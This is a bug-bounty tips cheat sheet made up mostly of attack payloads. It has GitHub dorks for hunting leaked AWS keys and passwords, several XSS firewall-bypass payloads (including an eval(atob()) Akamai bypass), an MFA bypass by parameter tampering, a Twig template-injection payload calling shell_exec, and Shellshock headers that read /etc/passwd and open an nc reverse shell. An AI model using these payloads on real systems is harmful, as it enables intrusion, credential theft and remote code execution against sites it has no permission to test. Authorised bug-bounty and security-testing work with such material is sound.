# Bug Bounty Tips File -2
## Github Search for Sensitive Info
```text
org:citrix "aws"
org:Target "bucket_name"
org:Target "aws_access_key"
org:Target "aws_secret_key"
org:Target "S3_BUCKET"
org:Target "S3_ACCESS_KEY_ID"
org:Target "S3_SECRET_ACCESS_KEY"
org:Target "S3_ENDPOINT"
org:Target  "AWS_ACCESS_KEY_ID"
org:Target  "list_aws_accounts"
api_key
“api keys”
authorization_bearer:
oauth
auth
authentication
client_secret
api_token:
“api token”
client_id
password
user_password
user_pass
passcode
client_secret
secret
password hash
OTP
user auth
```
## XSS Firewall Bypass Techniques
1. Check if firewall is blocking only lowercases
```js
<sCRipT>alert(1)</sCRiPt>
```
2. Try to break firewall regex with new line (\r\n)
```js
<script>%0aalert(1)</script>
```
3. Try double encoding
`%2522`
4. Testing for recursive filters, if firewall removes text in red, we will have clear payload
```js
<scr<script>ipt<alert(1);</scr<script>ipt>
```
5. Injecting anchor tag without whitespaces
```js
<a/href="j&Tab;a&Tab;v&Tab;asc&Tab;ri&Tab;pi&Tab;pt&Tab;alert&lpar;1&rpar;">
```
6. Try to Bypass whitespaces using Bullet
```js
<svg•onload=alert(1)>
```
7. Try to chnage the Request Method
```js
GET /?a=xss

POST /?a=xss
```
**New Payload to Bypass WAF**
```js
<script>alert?.(document?.domain)</script>
```
## Find xmlrpc in single shot
```sh
cat domain.txt | assetfinder --subs-only | httprobe | while read url; do xml=$(curl -s -L $url/xmlrpc.php | grep 'XML-RPC');echo -e "$url -> $xml";done | grep 'XML-RPC' | sort -u
```
## Bypass Multifactor Authentication
1. Notice both the request while login when 2FA is enabled and disabled
2. While 2FA is Disabled :

**Request**
```json
{"email":"abc@mail.com","pass":"password","mfa":null,"code":""}
```
**Response**
```json
Location : https://abc.com/user/dashboard 
```
3. While 2FA is Enabled :

**Resuest**
```json
{"email":"abc@mail.com","pass":"password","mfa":true,"code":""}
```
**Response**
```json
Location : https://abc.com/v1/proxy/authentication/authenticate
```
4. Tamper the Parameter and change the "mfa":null and "code":"" to disable the 2FA
```json
Location : https://abc.com/user/dashboard
```
## DOM XSS
![dom-xss](img/20201007_195906.jpg)
## WAF Bypass 
![waf-bypass](img/waf-bypass.jpg)
## Automate Subdomain Takeover
```sh
cat subfinder -dL domain.txt -o sub.txt && subjack -w sub.txt |toslack
```
***Put it on cron to run once a day***
## Akami WAF Bypass
Reflection in "a" tag, attribute context:
```
< => allowed
<anything> => access denied
quotes => allowed
onanything= => access denied
/ or \ or eval() => access denied
```
**Bypass**
```js
"<>onauxclick<>=(eval)(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))>+<sss
```
## Find Reflected XSS
1. subfinder + httprobe
```sh
subfinder -d abc.com | httprobe -c 100 > target.txt
cat target.txt | waybackurls | gf xss | kxss
```
2. Check the URL which have all the special characters unfiltered and the paramater was callback=
3. Check Portswigger XSS CheatSheet for more information.
## XSS Cloudflare Bypass
```js
<x/onpointerRawupdate=confirm%26Ipar;1)//x
```
## Bypass Admin Location
1. If GET /admin/ is 403
2. Try this GET /admin;/
## Server SIde Template Injection
```sh
{{_self.env.registerUndefinedFilterCallback('shell_exec')}}{{_self.env.getFilter('dir)}}
```
**Tool for Burpsuite**
> ***https://github.com/antichown/0x94TR***   
> ***For more info - Exploit Proof of Concept***   
> ***https://youtu.be/TrQi9iwtA0k***
## Test on CGI (cgi-bin)
```sh
User-Agent: () { :;}; echo $(</etc/passwd)
() { :;}; /usr/bin/nc ip 1337 -e /bin/bash
```
## Github Dorks cheat sheet
![cheatsheet](img/gitdork.jpg)
## SQLi
![sqli](img/sqli-2.jpg)
